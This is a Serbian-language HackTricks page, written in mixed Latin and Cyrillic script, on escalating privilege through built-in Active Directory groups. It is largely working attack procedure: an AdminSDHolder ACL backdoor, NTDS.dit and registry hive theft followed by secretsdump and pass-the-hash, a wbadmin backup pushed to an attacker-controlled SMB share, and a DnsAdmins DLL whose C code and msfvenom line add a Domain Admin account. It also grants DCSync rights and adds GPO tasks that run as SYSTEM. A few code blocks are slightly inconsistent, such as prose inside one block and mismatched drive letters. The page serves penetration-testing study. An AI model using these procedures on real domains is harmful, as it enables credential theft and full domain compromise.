# Privilegovane grupe

{{#include ../../banners/hacktricks-training.md}}

## Poznate grupe sa administratorskim privilegijama

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Ova grupa može da kreira naloge i grupe koje nisu administratori na domenu. Pored toga, omogućava lokalno prijavljivanje na Domain Controller (DC).

Da bi se identifikovali članovi ove grupe, izvršava se sledeća komanda:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Додавање нових корисника је дозвољено, као и локална пријава на DC.<sup>[[1]](#references)</sup>

## AdminSDHolder group

**AdminSDHolder** group's Access Control List (ACL) је од кључног значаја јер поставља дозволе за све „protected groups“ унутар Active Directory-ја, укључујући групе са високим привилегијама. Овај механизам обезбеђује безбедност ових група спречавањем неовлашћених измена.

Нападач би ово могао да искористи изменом ACL-а **AdminSDHolder** групе, чиме би стандардном кориснику доделио пуне дозволе. То би том кориснику практично дало потпуну контролу над свим protected groups. Ако се дозволе овог корисника измене или уклоне, аутоматски би биле поново успостављене у року од једног сата због начина на који је систем дизајниран.<sup>[[14]](#references)</sup>

Недавна Windows Server документација и даље третира неколико уграђених operator groups као **protected** објекте (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, итд.). Процес **SDProp** се подразумевано покреће на **PDC Emulator**-у сваких 60 минута, поставља `adminCount=1` и онемогућава наслеђивање на protected објектима. Ово је корисно и за persistence и за проналажење застарелих привилегованих корисника који су уклоњени из protected group, али и даље задржавају ACL без наслеђивања.<sup>[[12]](#references)</sup>

Команде за преглед чланова и измену дозвола укључују:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Dostupna je skripta za ubrzavanje procesa obnavljanja: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Za više detalja posetite [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## AD Recycle Bin

Članstvo u ovoj grupi omogućava čitanje obrisanih Active Directory objekata, što može otkriti osetljive informacije:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Ovo je korisno za **rekonstrukciju prethodnih putanja privilegija**. Obrisani objekti i dalje mogu otkriti `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, stare SPN-ove ili DN obrisane privilegovane grupe koju drugi operater kasnije može vratiti.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Pristup kontroleru domena

Pristup datotekama na DC-u je ograničen, osim ako je korisnik član grupe `Server Operators`, što menja nivo pristupa.

### Eskalacija privilegija

Korišćenjem alata `PsService` ili `sc` iz paketa Sysinternals moguće je pregledati i izmeniti dozvole servisa. Grupa `Server Operators`, na primer, ima potpunu kontrolu nad određenim servisima, što omogućava izvršavanje proizvoljnih komandi i eskalaciju privilegija:<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
Ova komanda otkriva da `Server Operators` imaju potpun pristup, što omogućava manipulisanje servisima radi dobijanja viših privilegija.

## Backup Operators

Članstvo u grupi `Backup Operators` omogućava pristup sistemu datoteka na `DC01` računaru zahvaljujući privilegijama `SeBackup` i `SeRestore`. Ove privilegije omogućavaju prolazak kroz fascikle, izlistavanje i kopiranje datoteka, čak i bez eksplicitnih dozvola, korišćenjem oznake `FILE_FLAG_BACKUP_SEMANTICS`. Za ovaj proces neophodno je koristiti određene skripte.<sup>[[1]](#references)</sup>

Da biste izlistali članove grupe, izvršite:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Lokalni napad

Za iskorišćavanje ovih privilegija lokalno, primenjuju se sledeći koraci:

1. Uvezite neophodne biblioteke:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Omogućite i proverite `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Pristupite i kopirajte datoteke iz ograničenih direktorijuma, na primer:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Direktan pristup datotečnom sistemu Domain Controller-a omogućava krađu `NTDS.dit` baze podataka, koja sadrži sve NTLM hash-eve korisnika i računara u domenu.

#### Using diskshadow.exe

1. Kreirajte shadow copy `C` diska:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Kopirajte `NTDS.dit` iz shadow copy-ja:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativno, koristite `robocopy` za kopiranje datoteka:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Izdvojite `SYSTEM` i `SAM` radi preuzimanja hash-eva:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Preuzmite sve hash vrednosti iz `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Nakon ekstrakcije: Pass-the-Hash do DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Korišćenje wbadmin.exe

1. Podesite NTFS filesystem za SMB server na napadačkoj mašini i keširajte SMB credentials na ciljnoj mašini.
2. Koristite `wbadmin.exe` za system backup i ekstrakciju `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Za praktičnu demonstraciju pogledajte [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Članovi grupe **DnsAdmins** mogu da iskoriste svoje privilegije za učitavanje proizvoljnog DLL-a sa SYSTEM privilegijama na DNS serveru, koji je često hostovan na kontrolerima domena. Ova mogućnost pruža značajan potencijal za exploitation.

Za izlistavanje članova grupe DnsAdmins koristite:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> Ova ranjivost omogućava izvršavanje proizvoljnog koda sa SYSTEM privilegijama u DNS servisu (obično unutar DC-ova). Ovaj problem je otklonjen 2021. godine.

Članovi mogu naterati DNS server da učita proizvoljan DLL (lokalno ili sa udaljenog share-a) koristeći komande kao što su:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Ponovno pokretanje DNS servisa (što može zahtevati dodatne dozvole) neophodno je da bi DLL bio učitan:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Za više detalja o ovom attack vektoru pogledajte ired.team.

#### Mimilib.dll

Takođe je moguće koristiti mimilib.dll za izvršavanje komandi, tako što se izmeni radi izvršavanja određenih komandi ili reverse shell-ova. [Pogledajte ovu objavu](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) za više informacija.<sup>[[15]](#references)</sup>

### WPAD Record for MitM

DnsAdmins mogu da manipulišu DNS zapisima radi izvođenja Man-in-the-Middle (MitM) napada, kreiranjem WPAD zapisa nakon onemogućavanja globalne query block liste. Alati kao što su Responder ili Inveigh mogu se koristiti za spoofing i presretanje mrežnog saobraćaja.

### Event Log Readers
Članovi mogu da pristupe event logovima i potencijalno pronađu osetljive informacije, kao što su plaintext lozinke ili detalji o izvršavanju komandi:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Ova grupa može da menja DACL-ove na objektu domena, potencijalno dodeljujući DCSync privilegije. Tehnike za eskalaciju privilegija koje iskorišćavaju ovu grupu detaljno su opisane u Exchange-AD-Privesc GitHub repozitorijumu.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Ako možete delovati kao član ove grupe, klasična zloupotreba je da principal-u pod kontrolom napadača dodelite prava replikacije potrebna za [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Istorijski gledano, **PrivExchange** je povezao pristup poštanskom sandučetu, prisilnu Exchange autentikaciju i LDAP relay kako bi omogućio dobijanje ovog istog primitiva. Čak i kada je taj relay put ublažen, direktno članstvo u grupi `Exchange Windows Permissions` ili kontrola nad Exchange serverom i dalje predstavljaju veoma vredan put do prava za replikaciju domena.

## Hyper-V Administrators

Hyper-V Administrators imaju potpun pristup Hyper-V-u, što se može iskoristiti za preuzimanje kontrole nad virtuelizovanim kontrolerima domena. To obuhvata kloniranje aktivnih DC-ova i izdvajanje NTLM hash-eva iz datoteke NTDS.dit.

### Primer eksploatacije

Praktična zloupotreba se obično zasniva na **offline pristupu diskovima/checkpoint-ima DC-ova**, a ne na starim LPE trikovima na nivou hosta. Uz pristup Hyper-V hostu, operator može da kreira checkpoint ili izveze virtuelizovani Domain Controller, montira VHDX i izdvoji `NTDS.dit`, `SYSTEM` i druge tajne bez pristupanja LSASS-u unutar gosta:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Odavde ponovo upotrebite workflow `Backup Operators` da biste kopirali `Windows\NTDS\ntds.dit` i hive-ove registra van mreže.

## Group Policy Creators Owners

Ova grupa omogućava članovima da kreiraju Group Policies u domenu. Međutim, njeni članovi ne mogu da primene group policies na korisnike ili grupe, niti da uređuju postojeće GPO-ove.

Važna pojedinost je to što **kreator postaje vlasnik novog GPO-a** i obično dobija dovoljno prava da ga naknadno uređuje. To znači da je ova grupa interesantna kada možete da:

- kreirate malicious GPO i ubedite administratora da ga poveže sa ciljnim OU-om/domenom
- uređujete GPO koji ste kreirali, a koji je već povezan na korisnom mestu
- zloupotrebite drugo delegirano pravo koje vam omogućava da povezujete GPO-ove, dok vam ova grupa daje mogućnost uređivanja

Praktična zloupotreba obično podrazumeva dodavanje **Immediate Task-a**, **startup script-a**, članstva u lokalnoj administratorskoj grupi ili izmene **user rights assignment** podešavanja kroz policy fajlove podržane sistemom SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Ako ručno uređujete GPO kroz `SYSVOL`, imajte na umu da sama izmena nije dovoljna: `versionNumber`, `GPT.ini` i ponekad `gPCMachineExtensionNames` takođe moraju biti ažurirani, u suprotnom će klijenti ignorisati osvežavanje policy-ja.<sup>[[9]](#references)</sup>

## Organization Management

U okruženjima u kojima je **Microsoft Exchange** implementiran, posebna grupa poznata kao **Organization Management** poseduje značajne mogućnosti. Ova grupa ima privilegije za **pristup poštanskim sandučićima svih korisnika domena** i održava **potpunu kontrolu nad organizacionom jedinicom (OU) „Microsoft Exchange Security Groups“**. Ova kontrola obuhvata i grupu **`Exchange Windows Permissions`**, koja može biti iskorišćena za privilege escalation.

### Iskorišćavanje privilegija i komande

#### Print Operators

Članovi grupe **Print Operators** imaju nekoliko privilegija, uključujući **`SeLoadDriverPrivilege`**, koja im omogućava da se **lokalno prijave na Domain Controller**, isključe ga i upravljaju štampačima. Za iskorišćavanje ovih privilegija, naročito ako **`SeLoadDriverPrivilege`** nije vidljiv u unelevated kontekstu, neophodno je zaobići User Account Control (UAC).<sup>[[1]](#references)</sup>

Za izlistavanje članova ove grupe koristi se sledeća PowerShell komanda:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Na Domain Controllers, ova grupa je opasna zato što podrazumevana Domain Controller Policy dodeljuje **`SeLoadDriverPrivilege`** grupi `Print Operators`. Ako dobijete elevated token člana ove grupe, možete omogućiti privilegiju i učitati signed-but-vulnerable driver da biste prešli na kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup> Za detalje o rukovanju tokenima pogledajte [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Članovima ove grupe dodeljen je pristup računarima putem Remote Desktop Protocol (RDP). Za izlistavanje ovih članova dostupne su PowerShell komande:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Dalji uvidi u iskorišćavanje RDP-a mogu se pronaći u namenskim resursima za pentesting.

#### Remote Management Users

Članovi mogu pristupati računarima preko **Windows Remote Management (WinRM)**. Enumeracija ovih članova vrši se pomoću:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Za tehnike eksploatacije povezane sa **WinRM**, potrebno je konsultovati odgovarajuću dokumentaciju.

#### Server Operators

Ova grupa ima dozvole za obavljanje različitih konfiguracija na Domain Controllers, uključujući privilegije za pravljenje rezervnih kopija i vraćanje podataka, promenu sistemskog vremena i isključivanje sistema.<sup>[[1]](#references)</sup> Za enumeraciju članova koristi se sledeća komanda:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Na Domain Controllers, `Server Operators` obično nasleđuju dovoljno prava za **ponovnu konfiguraciju ili pokretanje/zaustavljanje servisa**, a takođe dobijaju `SeBackupPrivilege`/`SeRestorePrivilege` putem podrazumevane DC politike. U praksi, to ih čini vezom između **zloupotrebe kontrole servisa** i **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Ako ACL servisa ovoj grupi daje prava za menjanje/pokretanje, usmerite servis na proizvoljnu komandu, pokrenite ga kao `LocalSystem`, a zatim vratite originalni `binPath`. Ako je kontrola servisa zaključana, koristite prethodno navedene tehnike za `Backup Operators` da biste kopirali `NTDS.dit`.

## Reference

- [1] [ired.team – Privileged Accounts and Token Privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Abusing SeLoadDriverPrivilege for Privilege Escalation](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Abusing GPO Permissions](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO Abuse - Part 1](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – A Red Teamer's Guide to GPOs and OUs](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Undocumented NT Internals – NtLoadDriver Function](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [11] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Appendix C: Protected Accounts and Groups in Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – How to Abuse and Backdoor AdminSDHolder to Obtain Domain Admin Persistence](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Abusing DnsAdmins Privilege for Escalation in Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)

{{#include ../../banners/hacktricks-training.md}}
